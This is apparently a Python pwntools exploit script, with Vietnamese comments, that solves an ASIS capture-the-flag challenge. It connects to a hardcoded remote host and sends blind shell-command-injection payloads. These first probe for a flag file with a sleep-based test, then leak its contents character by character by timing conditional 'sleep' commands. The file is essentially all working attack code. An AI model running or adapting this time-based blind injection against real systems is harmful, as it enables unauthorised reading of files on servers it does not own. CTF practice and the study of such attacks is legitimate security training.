from pwn import *
import time
import string

# --- Cấu hình ---
HOST = "65.109.210.228"
PORT = 31333
TIMEOUT_THRESHOLD = 2.5  # Ngưỡng thời gian để xác định điều kiện là ĐÚNG
SLEEP_DURATION = 3       # Thời gian sleep trong payload

# Bộ ký tự để thử, có thể thêm các ký tự đặc biệt nếu cần
CHARSET = string.ascii_letters + string.digits + "_@{}-!$." + string.punctuation

# --- Hàm trợ giúp ---

def check_condition(payload):
    """
    Gửi một payload và kiểm tra xem nó có gây ra độ trễ thời gian hay không.
    Trả về True nếu có độ trễ, False nếu không.
    """
    try:
        p = remote(HOST, PORT, timeout=10)
        p.recvuntil(b"Please send your input :) ")
        
        start_time = time.time()
        p.sendline(payload.encode())
        p.recvall() # Chờ cho đến khi server đóng kết nối
        end_time = time.time()
        
        duration = end_time - start_time
        
        if duration > TIMEOUT_THRESHOLD:
            return True
        else:
            return False
    except Exception as e:
        # print(f"\nLỗi kết nối: {e}")
        return False # Giả định là False nếu có lỗi

# --- Logic chính ---

# Bước 1: Tìm tên file chứa flag
print("[*] Bước 1: Đang tìm tên file chứa flag...")
possible_filenames = ["flag.txt", "flag"]
found_filename = None

for filename in possible_filenames:
    print(f"    -> Đang thử '{filename}'...")
    # Payload kiểm tra sự tồn tại của file (-f)
    test_payload = f"if [ -f {filename} ]; then sleep {SLEEP_DURATION}; fi"
    if check_condition(test_payload):
        found_filename = filename
        print(f"[+] Tìm thấy file flag: {found_filename}")
        break

if not found_filename:
    print("[-] Không tìm thấy file flag nào trong danh sách. Dừng lại.")
    exit()

# Bước 2: Leak nội dung flag từ file đã tìm thấy
print(f"\n[*] Bước 2: Đang leak flag từ file '{found_filename}'...")
flag = ""
# Giả sử flag bắt đầu bằng "flag{" để tăng tốc
# Nếu không chắc, hãy bắt đầu với flag = ""
flag = "ASIS{" 

try:
    while True:
        found_next_char = False
        # Vị trí 0-indexed của ký tự tiếp theo
        char_index = len(flag)
        
        for char_to_test in CHARSET:
            # In tiến trình trên cùng một dòng
            print(f"    -> Đang thử: {flag}{char_to_test}", end='\r')
            
            # Xử lý các ký tự đặc biệt cần được escape trong shell
            # Đặt ký tự vào trong dấu nháy đơn ' ' là cách an toàn nhất
            char_for_shell = f"'{char_to_test}'"

            # Payload sử dụng shell built-in để tăng độ tin cậy
            payload = (
                f"read -r line < {found_filename}; "
                f"char=${{line:{char_index}:1}}; "
                f"if [ \"$char\" = {char_for_shell} ]; then sleep {SLEEP_DURATION}; fi"
            )
            
            if check_condition(payload):
                flag += char_to_test
                # Xóa dòng tiến trình và in kết quả mới
                print(" " * 50, end='\r') 
                print(f"[+] Tìm thấy ký tự mới: {flag}")
                found_next_char = True
                break
        
        if not found_next_char:
            print("\n[-] Không tìm thấy ký tự tiếp theo trong bộ ký tự. Có thể flag đã kết thúc.")
            break
            
        # Điều kiện dừng phổ biến
        if flag.endswith("}"):
            print("\n[+] Tìm thấy dấu '}', có thể đây là flag hoàn chỉnh.")
            break

except KeyboardInterrupt:
    print("\n[!] Người dùng đã dừng chương trình.")

finally:
    print(f"\n\n[!] Flag cuối cùng tìm được: {flag}\n")